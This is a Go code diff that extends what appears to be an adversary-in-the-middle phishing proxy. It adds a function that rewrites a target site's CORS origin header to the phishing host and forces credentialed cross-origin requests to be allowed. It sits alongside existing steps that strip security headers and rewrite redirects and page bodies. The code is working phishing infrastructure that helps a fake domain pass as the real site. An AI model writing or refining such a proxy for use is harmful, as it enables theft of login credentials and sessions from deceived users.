@@ -1061,6 +1061,7 @@ func (m *ProxyHandler) processResponseWithoutSessionContext(resp *http.Response,
 
 	// apply basic response processing
 	m.removeSecurityHeaders(resp)
+	m.rewriteCORSHeaderWithoutSession(resp, config)
 	m.rewriteLocationHeaderWithoutSession(resp, config)
 	m.applyCustomResponseHeaderReplacementsWithoutSession(resp, config, reqCtx.TargetDomain, reqCtx.ProxyConfig)
 	m.rewriteResponseBodyWithoutSessionContext(resp, reqCtx, config)
@@ -1153,6 +1154,25 @@ func (m *ProxyHandler) rewriteLocationHeaderWithoutSession(resp *http.Response, 
 			resp.Header.Set("Location", rURL.String())
 		}
 	}
+}
+
+// rewriteCORSHeaderWithoutSession maps the Access-Control-Allow-Origin host from
+// the target to its phishing equivalent so cross origin requests that carry no
+// proxy session still see an origin that matches the phishing host. A wildcard
+// origin needs no rewrite.
+func (m *ProxyHandler) rewriteCORSHeaderWithoutSession(resp *http.Response, config map[string]service.ProxyServiceDomainConfig) {
+	allowOrigin := resp.Header.Get("Access-Control-Allow-Origin")
+	if allowOrigin == "" || allowOrigin == "*" {
+		return
+	}
+
+	if oURL, err := url.Parse(allowOrigin); err == nil {
+		if phishHost := m.replaceHostWithPhished(oURL.Host, config); phishHost != "" {
+			oURL.Host = phishHost
+			resp.Header.Set("Access-Control-Allow-Origin", oURL.String())
+		}
+	}
+	resp.Header.Set("Access-Control-Allow-Credentials", "true")
 }
 
 func (m *ProxyHandler) rewriteResponseBodyWithoutSessionContext(resp *http.Response, reqCtx *RequestContext, configMap map[string]service.ProxyServiceDomainConfig) {
